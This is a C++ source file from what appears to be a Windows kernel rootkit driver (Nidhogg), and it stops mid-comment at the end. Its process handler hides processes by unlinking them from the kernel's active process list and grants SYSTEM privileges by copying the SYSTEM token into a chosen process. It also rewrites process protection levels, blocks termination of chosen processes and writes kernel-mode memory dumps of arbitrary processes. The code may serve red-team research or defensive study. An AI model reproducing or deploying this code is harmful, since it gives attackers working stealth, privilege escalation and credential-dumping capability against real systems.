#include "pch.h"
#include "ProcessHandler.h"

namespace {
	constexpr ULONG MINIDUMP_SIGNATURE = 0x504D444D;
	constexpr ULONG MINIDUMP_VERSION = 0x0000A793;
	constexpr ULONG MINIDUMP_SYSTEM_INFO_STREAM = 7;
	constexpr ULONG MINIDUMP_MEMORY64_LIST_STREAM = 9;
	constexpr ULONGLONG MINIDUMP_WITH_FULL_MEMORY = 0x00000002;
	constexpr USHORT PROCESSOR_ARCHITECTURE_AMD64_VALUE = 9;
	constexpr ULONG VER_PLATFORM_WIN32_NT_VALUE = 2;
	constexpr SIZE_T DUMP_COPY_CHUNK_SIZE = 1024 * 1024;
	constexpr LONGLONG WINDOWS_TO_UNIX_EPOCH = 116444736000000000LL;

	struct KernelMinidumpHeader {
		ULONG Signature;
		ULONG Version;
		ULONG NumberOfStreams;
		ULONG StreamDirectoryRva;
		ULONG CheckSum;
		ULONG TimeDateStamp;
		ULONGLONG Flags;
	};

	struct KernelMinidumpLocationDescriptor {
		ULONG DataSize;
		ULONG Rva;
	};

	struct KernelMinidumpDirectory {
		ULONG StreamType;
		KernelMinidumpLocationDescriptor Location;
	};

	struct KernelMinidumpSystemInfo {
		USHORT ProcessorArchitecture;
		USHORT ProcessorLevel;
		USHORT ProcessorRevision;
		UCHAR NumberOfProcessors;
		UCHAR ProductType;
		ULONG MajorVersion;
		ULONG MinorVersion;
		ULONG BuildNumber;
		ULONG PlatformId;
		ULONG CsdVersionRva;
		ULONGLONG ProcessorFeatures[2];
		ULONGLONG Reserved;
	};

	struct KernelMinidumpMemoryDescriptor64 {
		ULONGLONG StartOfMemoryRange;
		ULONGLONG DataSize;
	};

	using ZwQueryVirtualMemoryFn = NTSTATUS(NTAPI*)(
		HANDLE,
		PVOID,
		ULONG,
		PVOID,
		SIZE_T,
		PSIZE_T
	);

	static_assert(sizeof(KernelMinidumpHeader) == 32);
	static_assert(sizeof(KernelMinidumpDirectory) == 12);
	static_assert(sizeof(KernelMinidumpSystemInfo) == 56);
	static_assert(sizeof(KernelMinidumpMemoryDescriptor64) == 16);
}

_IRQL_requires_max_(APC_LEVEL)
ProcessHandler::ProcessHandler() {
	if (!InitializeList(&protectedProcesses))
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);

	if (!InitializeList(&hiddenProcesses)) {
		FreeVirtualMemory(this->protectedProcesses.Items);
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);
	}
}

_IRQL_requires_same_
_IRQL_requires_(PASSIVE_LEVEL)
ProcessHandler::~ProcessHandler() {
	ClearProcessList(ProcessType::All);
	FreeVirtualMemory(this->protectedProcesses.Items);
	FreeVirtualMemory(this->hiddenProcesses.Items);
}

/*
* Description:
* OnPreOpenProcess is responsible for handling process access operations and remove certain permissions from protected processes.
*
* Parameters:
* @RegistrationContext [PVOID]						   -- Unused.
* @Info				   [POB_PRE_OPERATION_INFORMATION] -- Contains important information such as process name, handle to the process, process type, etc.
*
* Returns:
* @status			   [NTSTATUS]					   -- Always OB_PREOP_SUCCESS.
*/
OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(_Inout_ PVOID registrationContext, _Inout_ POB_PRE_OPERATION_INFORMATION info) {
	UNREFERENCED_PARAMETER(registrationContext);

	if (info->KernelHandle || !info->Object)
		return OB_PREOP_SUCCESS;

	PEPROCESS process = static_cast<PEPROCESS>(info->Object);
	ULONG pid = HandleToULong(PsGetProcessId(process));

	// If the process was found on the list, remove permissions for dump / write process memory and kill the process.
	if (NidhoggProcessHandler->FindProcess(pid, ProcessType::Protected)) {
		info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_OPERATION;
		info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_READ;
		info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_CREATE_THREAD;
		info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_DUP_HANDLE;
		info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE;
	}

	return OB_PREOP_SUCCESS;
}

/*
* Description:
* OnProcessCreationExit is responsible for restoring hidden modules when a process exits.
* 
* Parameters:
* @parentId  [_In_ HANDLE]	 -- Parent PID, unused.
* @processId [_In_ HANDLE]	 -- PID of the process that was created or exited.
* @create	 [_In_ BOOLEAN]  -- TRUE if the process was created, FALSE if it exited.
* 
* Returns:
* There is no return value.
*/
void OnProcessCreationExit(_In_ HANDLE parentId, _In_ HANDLE processId, _In_ BOOLEAN create) {
	UNREFERENCED_PARAMETER(parentId);
	ULONG pid = HandleToUlong(processId);

	if (create || pid <= SYSTEM_PROCESS_PID)
		return;
	NidhoggMemoryHandler->RestoreModules(pid);
}

/*
* Description:
* HideProcess is responsible for hiding a process by modifying the process list.
*
* Parameters:
* @pid	  [_In_ ULONG]	 -- PID to hide.
*
* Returns:
* @status [NTSTATUS]	 -- Whether successfully hidden or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS ProcessHandler::HideProcess(_In_ ULONG pid) {
	PEPROCESS targetProcess;
	HiddenProcessEntry entry = { 0 };
	NTSTATUS status = STATUS_SUCCESS;
	ULONG activeProcessLinkListOffset = GetActiveProcessLinksOffset();
	ULONG lockOffset = GetProcessLockOffset();

	if (!IsValidPid(pid))
		return STATUS_INVALID_PARAMETER;

	if (activeProcessLinkListOffset == 0 || lockOffset == 0)
		return STATUS_UNSUCCESSFUL;

	if (FindProcess(pid, ProcessType::Hidden))
		return STATUS_SUCCESS;

	status = PsLookupProcessByProcessId(ULongToHandle(pid), &targetProcess);

	if (!NT_SUCCESS(status))
		return status;

	PLIST_ENTRY processListEntry = reinterpret_cast<PLIST_ENTRY>(reinterpret_cast<ULONG_PTR>(targetProcess) + activeProcessLinkListOffset);

	// Using the ActiveProcessLinks lock to avoid accessing problems.
	PEX_PUSH_LOCK listLock = reinterpret_cast<PEX_PUSH_LOCK>(reinterpret_cast<ULONG_PTR>(targetProcess) + lockOffset);
	ExAcquirePushLockExclusive(listLock);

	// Saving the hidden process' list entry for the future to release it.
	entry.OriginalEntry = processListEntry;
	entry.Pid = pid;

	if (!AddHiddenProcess(entry)) {
		ExReleasePushLockExclusive(listLock);
		ObDereferenceObject(targetProcess);
		return STATUS_UNSUCCESSFUL;
	}

	__try {
		RemoveEntryList(processListEntry);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		status = GetExceptionCode();
		RemoveListEntry(&hiddenProcesses, &entry);
	}
	ExReleasePushLockExclusive(listLock);
	ObDereferenceObject(targetProcess);
	return status;
}

/*
* Description:
* UnhideProcess is responsible for unhiding a hidden process by modifying the process list.
*
* Parameters:
* @pid	  [ULONG]	 -- PID to unhide.
*
* Returns:
* @status [NTSTATUS] -- Whether successfully hidden or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS ProcessHandler::UnhideProcess(_In_ ULONG pid) {
	PEPROCESS targetProcess;
	NTSTATUS status = STATUS_SUCCESS;
	HiddenProcessEntry* entryToRestore = nullptr;
	auto finder = [](const HiddenProcessEntry* item, ULONG searchable) {
		return item->Pid == searchable;
	};

	if (!IsValidPid(pid))
		return STATUS_INVALID_PARAMETER;
	entryToRestore = FindListEntry<ProcessList, HiddenProcessEntry, ULONG>(this->hiddenProcesses, pid, finder);

	if (!entryToRestore)
		return STATUS_NOT_FOUND;

	ULONG activeProcessLinkListOffset = GetActiveProcessLinksOffset();
	ULONG lockOffset = GetProcessLockOffset();

	if (activeProcessLinkListOffset == 0 || lockOffset == 0)
		return STATUS_UNSUCCESSFUL;

	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &targetProcess);

	if (!NT_SUCCESS(status))
		return status;

	PLIST_ENTRY processListEntry = reinterpret_cast<PLIST_ENTRY>(reinterpret_cast<ULONG_PTR>(targetProcess) + activeProcessLinkListOffset);

	// Using the ActiveProcessLinks lock to avoid accessing problems.
	PEX_PUSH_LOCK listLock = reinterpret_cast<PEX_PUSH_LOCK>(reinterpret_cast<ULONG_PTR>(targetProcess) + lockOffset);
	ExAcquirePushLockExclusive(listLock);

	InsertHeadList(processListEntry, entryToRestore->OriginalEntry);

	ExReleasePushLockExclusive(listLock);
	ObDereferenceObject(targetProcess);
	
	status = RemoveListEntry<ProcessList, HiddenProcessEntry>(&hiddenProcesses, entryToRestore) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;

	return status;
}

/*
* Description:
* ElevateProcess is responsible for stealing a token from the SYSTEM process and giving it to other process.
*
* Parameters:
* @pid	  [ULONG]	 -- PID to elevate.
*
* Returns:
* @status [NTSTATUS] -- Whether successfully elevated or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS ProcessHandler::ElevateProcess(_In_ ULONG pid) {
	PEPROCESS privilegedProcess;
	PEPROCESS targetProcess;
	NTSTATUS status = STATUS_SUCCESS;

	if (!IsValidPid(pid))
		return STATUS_INVALID_PARAMETER;

	// Getting the EProcess of the target and the privileged processes.
	status = PsLookupProcessByProcessId(ULongToHandle(pid), &targetProcess);
	UINT64 tokenOffset = GetTokenOffset();

	if (!NT_SUCCESS(status) || tokenOffset == 0)
		return status;

	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &privilegedProcess);

	if (!NT_SUCCESS(status)) {
		ObDereferenceObject(targetProcess);
		return status;
	}
	UINT64* targetToken = reinterpret_cast<UINT64*>(reinterpret_cast<UINT64>(targetProcess) + tokenOffset);
	UINT64* privilegedToken = reinterpret_cast<UINT64*>(reinterpret_cast<UINT64>(privilegedProcess) + tokenOffset);
	*targetToken = *privilegedToken;

	ObDereferenceObject(privilegedProcess);
	ObDereferenceObject(targetProcess);
	return status;
}

/*
* Description:
* SuspendProcess is responsible for suspending a process by its PID.
*
* Parameters:
* @pid	  [_In_ ULONG] -- PID to suspend.
*
* Returns:
* @status [NTSTATUS]  -- Whether the process was suspended successfully.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS ProcessHandler::SuspendProcess(_In_ ULONG pid) {
	using PsSuspendProcessFn = NTSTATUS(NTAPI*)(PEPROCESS);

	if (!IsValidPid(pid) || ULongToHandle(pid) == PsGetCurrentProcessId())
		return STATUS_INVALID_PARAMETER;

	UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"PsSuspendProcess");
	auto psSuspendProcess = reinterpret_cast<PsSuspendProcessFn>(MmGetSystemRoutineAddress(&routineName));

	if (!psSuspendProcess)
		return STATUS_NOT_SUPPORTED;

	PEPROCESS process = nullptr;
	NTSTATUS status = PsLookupProcessByProcessId(ULongToHandle(pid), &process);

	if (!NT_SUCCESS(status))
		return status;

	status = psSuspendProcess(process);
	ObDereferenceObject(process);
	return status;
}

/*
* Description:
* DumpProcess reads committed user-mode memory from a process and writes a minimal standard minidump.
*
* Parameters:
* @dumpRequest [_In_ const IoctlProcessDump&] -- PID and NT output path.
*
* Returns:
* @status [NTSTATUS] -- Whether the dump was written successfully.
*/
_IRQL_requires_(PASSIVE_LEVEL)
NTSTATUS ProcessHandler::DumpProcess(_In_ const IoctlProcessDump& dumpRequest) {
	if (!IsValidPid(dumpRequest.Pid) ||
		wcsnlen(dumpRequest.DumpPath, MAX_PATH_COPY) == MAX_PATH_COPY ||
		_wcsnicmp(dumpRequest.DumpPath, L"\\??\\", 4) != 0) {
		return STATUS_INVALID_PARAMETER;
	}

	UNICODE_STRING queryRoutineName = RTL_CONSTANT_STRING(L"ZwQueryVirtualMemory");
	auto queryVirtualMemory = reinterpret_cast<ZwQueryVirtualMemoryFn>(
		MmGetSystemRoutineAddress(&queryRoutineName));

	if (!queryVirtualMemory)
		return STATUS_NOT_SUPPORTED;

	PEPROCESS process = nullptr;
	HANDLE processHandle = nullptr;
	HANDLE fileHandle = nullptr;
	NTSTATUS status = PsLookupProcessByProcessId(ULongToHandle(dumpRequest.Pid), &process);

	if (!NT_SUCCESS(status))
		return status;

	UNICODE_STRING dumpPath{};
	RtlInitUnicodeString(&dumpPath, dumpRequest.DumpPath);
	OBJECT_ATTRIBUTES fileAttributes{};
	InitializeObjectAttributes(&fileAttributes, &dumpPath,
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, nullptr, nullptr);
	IO_STATUS_BLOCK ioStatus{};
	bool fileCreated = false;

	do {
		status = ObOpenObjectByPointer(
			process,
			OBJ_KERNEL_HANDLE,
			nullptr,
			PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
			*PsProcessType,
			KernelMode,
			&processHandle
		);

		if (!NT_SUCCESS(status))
			break;

		status = ZwCreateFile(
			&fileHandle,
			GENERIC_WRITE | SYNCHRONIZE,
			&fileAttributes,
			&ioStatus,
			nullptr,
			FILE_ATTRIBUTE_NORMAL,
			0,
			FILE_OVERWRITE_IF,
			FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
			nullptr,
			0
		);

		if (!NT_SUCCESS(status))
			break;
		fileCreated = true;

		auto IsDumpableRegion = [](const MEMORY_BASIC_INFORMATION& memoryInfo) -> bool {
			return memoryInfo.State == MEM_COMMIT &&
				memoryInfo.RegionSize != 0 &&
				(memoryInfo.Protect & PAGE_NOACCESS) == 0 &&
				(memoryInfo.Protect & PAGE_GUARD) == 0;
		};

		SIZE_T descriptorCapacity = 0;
		ULONG_PTR queryAddress = 0;
		const ULONG_PTR highestUserAddress = reinterpret_cast<ULONG_PTR>(MmHighestUserAddress);

		while (queryAddress <= highestUserAddress) {
			MEMORY_BASIC_INFORMATION memoryInfo{};
			SIZE_T returnedLength = 0;
			status = queryVirtualMemory(processHandle, reinterpret_cast<PVOID>(queryAddress), 0,
				&memoryInfo, sizeof(memoryInfo), &returnedLength);

			if (!NT_SUCCESS(status))
				break;

			if (IsDumpableRegion(memoryInfo))
				descriptorCapacity++;

			ULONG_PTR regionBase = reinterpret_cast<ULONG_PTR>(memoryInfo.BaseAddress);
			ULONG_PTR nextAddress = regionBase + memoryInfo.RegionSize;

			if (nextAddress <= queryAddress || nextAddress > highestUserAddress)
				break;
			queryAddress = nextAddress;
		}

		if (descriptorCapacity == 0) {
			status = STATUS_NOT_FOUND;
			break;
		}

		if (descriptorCapacity > MAXULONG_PTR / sizeof(KernelMinidumpMemoryDescriptor64)) {
			status = STATUS_INTEGER_OVERFLOW;
			break;
		}

		MemoryAllocator<KernelMinidumpMemoryDescriptor64*> descriptors(
			descriptorCapacity * sizeof(KernelMinidumpMemoryDescriptor64));

		if (!descriptors.IsValid()) {
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		SIZE_T descriptorCount = 0;
		queryAddress = 0;

		while (queryAddress <= highestUserAddress && descriptorCount < descriptorCapacity) {
			MEMORY_BASIC_INFORMATION memoryInfo{};
			SIZE_T returnedLength = 0;
			status = queryVirtualMemory(processHandle, reinterpret_cast<PVOID>(queryAddress), 0,
				&memoryInfo, sizeof(memoryInfo), &returnedLength);

			if (!NT_SUCCESS(status))
				break;

			if (IsDumpableRegion(memoryInfo)) {
				descriptors.Get()[descriptorCount].StartOfMemoryRange =
					reinterpret_cast<ULONGLONG>(memoryInfo.BaseAddress);
				descriptors.Get()[descriptorCount].DataSize =
					static_cast<ULONGLONG>(memoryInfo.RegionSize);
				descriptorCount++;
			}

			ULONG_PTR regionBase = reinterpret_cast<ULONG_PTR>(memoryInfo.BaseAddress);
			ULONG_PTR nextAddress = regionBase + memoryInfo.RegionSize;

			if (nextAddress <= queryAddress || nextAddress > highestUserAddress)
				break;
			queryAddress = nextAddress;
		}

		if (descriptorCount == 0) {
			status = STATUS_NOT_FOUND;
			break;
		}

		const ULONG streamCount = 2;
		const ULONG directoryRva = sizeof(KernelMinidumpHeader);
		const ULONG systemInfoRva = directoryRva + streamCount * sizeof(KernelMinidumpDirectory);
		const ULONG memoryListRva = systemInfoRva + sizeof(KernelMinidumpSystemInfo);
		const ULONGLONG memoryDataRva = static_cast<ULONGLONG>(memoryListRva) +
			sizeof(ULONGLONG) * 2 +
			static_cast<ULONGLONG>(descriptorCount) * sizeof(KernelMinidumpMemoryDescriptor64);

		if (memoryDataRva > MAXULONG) {
			status = STATUS_FILE_TOO_LARGE;
			break;
		}

		LARGE_INTEGER systemTime{};
		KeQuerySystemTime(&systemTime);
		ULONG timestamp = 0;

		if (systemTime.QuadPart > WINDOWS_TO_UNIX_EPOCH) {
			timestamp = static_cast<ULONG>(
				(systemTime.QuadPart - WINDOWS_TO_UNIX_EPOCH) / 10000000LL);
		}

		KernelMinidumpHeader header{
			MINIDUMP_SIGNATURE,
			MINIDUMP_VERSION,
			streamCount,
			directoryRva,
			0,
			timestamp,
			MINIDUMP_WITH_FULL_MEMORY
		};
		KernelMinidumpDirectory directories[streamCount]{};
		directories[0].StreamType = MINIDUMP_SYSTEM_INFO_STREAM;
		directories[0].Location.DataSize = sizeof(KernelMinidumpSystemInfo);
		directories[0].Location.Rva = systemInfoRva;
		directories[1].StreamType = MINIDUMP_MEMORY64_LIST_STREAM;
		directories[1].Location.DataSize = static_cast<ULONG>(
			sizeof(ULONGLONG) * 2 +
			descriptorCount * sizeof(KernelMinidumpMemoryDescriptor64));
		directories[1].Location.Rva = memoryListRva;

		RTL_OSVERSIONINFOW versionInfo{ sizeof(versionInfo) };
		status = RtlGetVersion(&versionInfo);

		if (!NT_SUCCESS(status))
			break;

		ULONG processorCount = KeQueryActiveProcessorCount(nullptr);
		KernelMinidumpSystemInfo systemInfo{};
		systemInfo.ProcessorArchitecture = PROCESSOR_ARCHITECTURE_AMD64_VALUE;
		systemInfo.NumberOfProcessors = static_cast<UCHAR>(processorCount > MAXUCHAR ? MAXUCHAR : processorCount);
		systemInfo.ProductType = 1;
		systemInfo.MajorVersion = versionInfo.dwMajorVersion;
		systemInfo.MinorVersion = versionInfo.dwMinorVersion;
		systemInfo.BuildNumber = versionInfo.dwBuildNumber;
		systemInfo.PlatformId = VER_PLATFORM_WIN32_NT_VALUE;

		LARGE_INTEGER fileOffset{};
		auto WriteData = [&](PVOID data, ULONG size) -> NTSTATUS {
			IO_STATUS_BLOCK writeStatus{};
			NTSTATUS writeResult = ZwWriteFile(fileHandle, nullptr, nullptr, nullptr, &writeStatus,
				data, size, &fileOffset, nullptr);

			if (!NT_SUCCESS(writeResult))
				return writeResult;
			if (writeStatus.Information != size)
				return STATUS_DISK_FULL;
			fileOffset.QuadPart += size;
			return STATUS_SUCCESS;
		};

		status = WriteData(&header, sizeof(header));

		if (!NT_SUCCESS(status))
			break;
		status = WriteData(directories, sizeof(directories));

		if (!NT_SUCCESS(status))
			break;
		status = WriteData(&systemInfo, sizeof(systemInfo));

		if (!NT_SUCCESS(status))
			break;

		ULONGLONG descriptorCount64 = descriptorCount;
		status = WriteData(&descriptorCount64, sizeof(descriptorCount64));

		if (!NT_SUCCESS(status))
			break;

		ULONGLONG memoryDataRvaValue = memoryDataRva;
		status = WriteData(&memoryDataRvaValue, sizeof(memoryDataRvaValue));

		if (!NT_SUCCESS(status))
			break;

		for (SIZE_T i = 0; i < descriptorCount; i++) {
			status = WriteData(&descriptors.Get()[i], sizeof(KernelMinidumpMemoryDescriptor64));

			if (!NT_SUCCESS(status))
				break;
		}

		if (!NT_SUCCESS(status))
			break;

		MemoryAllocator<PUCHAR> copyBuffer(DUMP_COPY_CHUNK_SIZE);

		if (!copyBuffer.IsValid()) {
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		for (SIZE_T i = 0; i < descriptorCount && NT_SUCCESS(status); i++) {
			ULONGLONG regionOffset = 0;

			while (regionOffset < descriptors.Get()[i].DataSize) {
				SIZE_T remaining = static_cast<SIZE_T>(descriptors.Get()[i].DataSize - regionOffset);
				SIZE_T chunkSize = remaining < DUMP_COPY_CHUNK_SIZE ? remaining : DUMP_COPY_CHUNK_SIZE;
				SIZE_T bytesCopied = 0;
				RtlSecureZeroMemory(copyBuffer.Get(), chunkSize);

				NTSTATUS copyStatus = MmCopyVirtualMemory(
					process,
					reinterpret_cast<PVOID>(
						descriptors.Get()[i].StartOfMemoryRange + regionOffset),
					PsGetCurrentProcess(),
					copyBuffer.Get(),
					chunkSize,
					KernelMode,
					&bytesCopied
				);

				if (!NT_SUCCESS(copyStatus) && copyStatus != STATUS_PARTIAL_COPY)
					bytesCopied = 0;

				UNREFERENCED_PARAMETER(bytesCopied);
				status = WriteData(copyBuffer.Get(), static_cast<ULONG>(chunkSize));

				if (!NT_SUCCESS(status))
					break;
				regionOffset += chunkSize;
			}
		}
	} while (false);

	if (fileHandle)
		ZwClose(fileHandle);
	if (processHandle)
		ZwClose(processHandle);
	ObDereferenceObject(process);

	if (!NT_SUCCESS(status) && fileCreated)
		ZwDeleteFile(&fileAttributes);

	return status;
}

/*
* Description:
* SetProcessSignature is responsible for removing or adding process protection to a certain process.
*
* Parameters:
* @processSignature [IoctlProcessSignature*] -- Contains the process PID, signer type and signature signer.
*
* Returns:
* @status  			[NTSTATUS] 				 -- Whether the operation was successful or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS ProcessHandler::SetProcessSignature(_In_ IoctlProcessSignature* processSignature) {
	PEPROCESS process;
	NTSTATUS status = STATUS_SUCCESS;

	if (!IsValidPid(processSignature->Pid))
		return STATUS_INVALID_PARAMETER;

	status = PsLookupProcessByProcessId(ULongToHandle(processSignature->Pid), &process);

	if (!NT_SUCCESS(status))
		return status;

	UCHAR newSignatureLevel = (processSignature->SignerType << 4) | processSignature->SignatureSigner;
	ULONG signatureLevelOffset = GetSignatureLevelOffset();

	if (signatureLevelOffset == 0) {
		ObDereferenceObject(process);
		return STATUS_UNSUCCESSFUL;
	}
	PPROCESS_SIGNATURE targetProcessSignature = reinterpret_cast<PPROCESS_SIGNATURE>(reinterpret_cast<UINT64>(process) + signatureLevelOffset);

	targetProcessSignature->SignatureLevel = newSignatureLevel;
	targetProcessSignature->Protection.Type = processSignature->SignerType;
	targetProcessSignature->Protection.Signer = processSignature->SignatureSigner;

	ObDereferenceObject(process);
	return status;
}

/*
* Description:
* FindProcess is responsible for searching if a process exists in the list of protected processes.
*
* Parameters:
* @pid	  [_In_ ULONG]		 -- PID to search.
* @type   [_In_ ProcessType] -- Type of process to search (Protected or Hidden).
*
* Returns:
* @bool						 -- Whether found or not.
*/
_IRQL_requires_max_(DISPATCH_LEVEL)
bool ProcessHandler::FindProcess(_In_ ULONG pid, _In_ ProcessType type) const {
	if (!IsValidPid(pid))
		return false;

	switch (type) {
		case ProcessType::Protected: {
			auto finder = [](_In_ const ProtectedProcessEntry* entry, _In_ ULONG pid) -> bool {
				return entry->Pid == pid;
			};

			return FindListEntry<ProcessList, ProtectedProcessEntry, ULONG>(
				this->protectedProcesses, pid, finder
			);
			break;
		}
		case ProcessType::Hidden: {
			auto finder = [](_In_ const HiddenProcessEntry* entry, _In_ ULONG pid) -> bool {
				return entry->Pid == pid;
			};

			return FindListEntry<ProcessList, HiddenProcessEntry, ULONG>(
				this->hiddenProcesses, pid, finder
			);
			break;
		}
		default:
			return false;
	}
}

/*
* Description:
* AddProcess is responsible for adding a process to the list of protected processes.
*
* Parameters:
* @pid [_In_ ULONG] -- PID to add.
*
* Returns:
* @bool				-- Whether successfully added or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool ProcessHandler::ProtectProcess(_In_ ULONG pid) {
	if (!IsValidPid(pid))
		return false;

	if (FindProcess(pid, ProcessType::Protected))
		return true;
	ProtectedProcessEntry* newEntry = AllocateMemory<ProtectedProcessEntry*>(sizeof(ProtectedProcessEntry));

	if (!newEntry)
		return false;
	newEntry->Pid = pid;
	AddEntry<ProcessList, ProtectedProcessEntry>(&protectedProcesses, newEntry);

	return true;
}

/*
* Description:
* AddProcess is responsible for adding a process to the list of protected processes.
*
* Parameters:
* @pid [_In_ ULONG] -- PID to add.
*
* Returns:
* @bool				-- Whether successfully added or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool ProcessHandler::AddHiddenProcess(_In_ HiddenProcessEntry hiddenProcess) {
	if (!IsValidPid(hiddenProcess.Pid) || !hiddenProcess.OriginalEntry)
		return false;

	if (FindProcess(hiddenProcess.Pid, ProcessType::Hidden))
		return false;
	HiddenProcessEntry* newEntry = AllocateMemory<HiddenProcessEntry*>(sizeof(HiddenProcessEntry));

	if (!newEntry)
		return false;
	newEntry->Pid = hiddenProcess.Pid;
	newEntry->OriginalEntry = hiddenProcess.OriginalEntry;
	AddEntry<ProcessList, HiddenProcessEntry>(&hiddenProcesses, newEntry);
	return true;
}

/*
* Description:
* RemoveProcess is responsible for remove a process from the list of protected processes.
*
* Parameters:
* @pid	  [_In_ ULONG]		 -- PID to remove.
* @type   [_In_ ProcessType] -- Type of process to remove (Protected or Hidden).
*
* Returns:
* @bool						 -- Whether successfully removed or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool ProcessHandler::RemoveProcess(_In_ ULONG pid, _In_ ProcessType type) {
	if (!IsValidPid(pid))
		return false;

	switch (type) {
	case ProcessType::Protected: {
		auto finder = [](_In_ const ProtectedProcessEntry* item, _In_ ULONG pid) {
			return item->Pid == pid;
		};
		ProtectedProcessEntry* entry = FindListEntry<ProcessList, ProtectedProcessEntry, ULONG>(protectedProcesses, pid, finder);

		if (!entry)
			return false;
		return RemoveListEntry<ProcessList, ProtectedProcessEntry>(&protectedProcesses, entry);
	}
	
	case ProcessType::Hidden: {
		auto finder = [](_In_ const HiddenProcessEntry* item, _In_ ULONG pid) {
			return item->Pid == pid;
			};
		HiddenProcessEntry* entry = FindListEntry<ProcessList, HiddenProcessEntry, ULONG>(hiddenProcesses, pid, finder);

		if (!entry)
			return false;
		return RemoveListEntry<ProcessList, HiddenProcessEntry>(&hiddenProcesses, entry);
	}
	default:
		return false;
	}
}

/*
* Description:
* ClearProcessList is responsible for clearing the list of protected or hidden processes.
*
* Parameters:
* @type   [_In_ ProcessType] -- Type of process to remove (Protected or Hidden).
*
* Returns:
* There is no return value.
*/
_IRQL_requires_max_(APC_LEVEL)
void ProcessHandler::ClearProcessList(_In_ ProcessType type) {
	switch (type) {
	case ProcessType::Protected:
		ClearList<ProcessList, ProtectedProcessEntry>(&this->protectedProcesses);
		break;
	case ProcessType::Hidden:
		ClearList<ProcessList, HiddenProcessEntry>(&this->hiddenProcesses);
		break;
	case ProcessType::All:
		ClearList<ProcessList, ProtectedProcessEntry>(&this->protectedProcesses);
		ClearList<ProcessList, HiddenProcessEntry>(&this->hiddenProcesses);
		break;
	}
}

/*
* Description:
* ListProtectedProcesses is responsible for listing all protected processes and writing their PIDs to the provided output structure.
* 
* Parameters:
* @processList [_Inout_ IoctlProcessList*] -- Output structure to write the PIDs of protected processes.
* 
* Returns:
* @bool										-- Whether the operation was successful or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool ProcessHandler::ListProtectedProcesses(_Inout_ IoctlProcessList* processList) {
	PLIST_ENTRY currentEntry = nullptr;
	SIZE_T count = 0;

	if (!processList)
		return false;

	AutoLock locker(protectedProcesses.Lock);

	if (protectedProcesses.Count == 0) {
		processList->Count = 0;
		return true;
	}
	if (processList->Count != protectedProcesses.Count)  {
		processList->Count = protectedProcesses.Count;
		return true;
	}
	MemoryGuard guard(processList->Processes, static_cast<ULONG>(sizeof(ULONG) * protectedProcesses.Count), UserMode);

	if (!guard.IsValid())
		return false;
	currentEntry = protectedProcesses.Items;

	while (currentEntry->Flink != protectedProcesses.Items && count < protectedProcesses.Count) {
		currentEntry = currentEntry->Flink;
		ProtectedProcessEntry* item = CONTAINING_RECORD(currentEntry, ProtectedProcessEntry, Entry);

		if (item)
			processList->Processes[count] = item->Pid;
		count++;
	}

	processList->Count = count;
	return true;
}

/*
* Description:
* ListProtectedProcesses is responsible for listing all protected processes and writing their PIDs to the provided output structure.
*
* Parameters:
* @processList [_Inout_ IoctlProcessList*] -- Output structure to write the PIDs of protected processes.
*
* Returns:
* @bool										-- Whether the operation was successful or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool ProcessHandler::ListHiddenProcesses(_Inout_ IoctlProcessList* processList) {
	PLIST_ENTRY currentEntry = nullptr;
	SIZE_T count = 0;

	if (!processList)
		return false;

	AutoLock locker(hiddenProcesses.Lock);

	if (hiddenProcesses.Count == 0) {
		processList->Count = 0;
		return true;
	}
	if (processList->Count != hiddenProcesses.Count) {
		processList->Count = hiddenProcesses.Count;
		return true;
	}
	MemoryGuard guard(processList->Processes, static_cast<ULONG>(sizeof(ULONG) * hiddenProcesses.Count), UserMode);

	if (!guard.IsValid())
		return false;
	currentEntry = hiddenProcesses.Items;

	while (currentEntry->Flink != hiddenProcesses.Items && count < hiddenProcesses.Count) {
		currentEntry = currentEntry->Flink;
		HiddenProcessEntry* item = CONTAINING_RECORD(currentEntry, HiddenProcessEntry, Entry);

		if (item)
			processList->Processes[count] = item->Pid;
		count++;
		currentEntry = currentEntry->Flink;
	}

	processList->Count = count;
	return true;
}

/*
* Description:
* GetTokenOffset is responsible for getting the main thread's token offset depends on the windows version.
* (field Token in _EPROCESS structure)
* Parameters:
* There are no parameters.
*
* Returns:
* @tokenOffset [ULONG] -- Offset of the main thread's token or 0.
*/
_IRQL_requires_max_(APC_LEVEL)
ULONG ProcessHandler::GetTokenOffset() const {
	ULONG tokenOffset = 0;

	if (WindowsBuildNumber > LATEST_VERSION)
		return tokenOffset;

	switch (WindowsBuildNumber) {
	case WIN_1507:
	case WIN_1511:
	case WIN_1607:
	case WIN_1703:
	case WIN_1709:
	case WIN_1803:
	case WIN_1809:
		tokenOffset = 0x358;
		break;
	case WIN_1903:
	case WIN_1909:
		tokenOffset = 0x360;
		break;
	case WIN_11_24H2:
	case WIN_11_25H2:
		tokenOffset = 0x248;
		break;
	default:
		tokenOffset = 0x4b8;
		break;
	}

	return tokenOffset;
}

/*
* Description:
